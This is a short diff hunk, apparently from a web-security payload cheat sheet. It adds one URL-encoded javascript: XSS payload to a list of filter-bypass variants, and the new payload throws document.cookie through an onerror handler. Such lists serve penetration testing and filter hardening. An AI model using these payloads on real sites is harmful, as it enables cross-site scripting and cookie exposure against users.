@@ -76,6 +76,7 @@
     javascript:%61lert(1)
     javascript:&#37&#54&#49lert(1)
     javascript:%26%2337%26%2354%26%2349lert(1)
+    javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
     ```
     
 - **Open Redirect to SSRF**
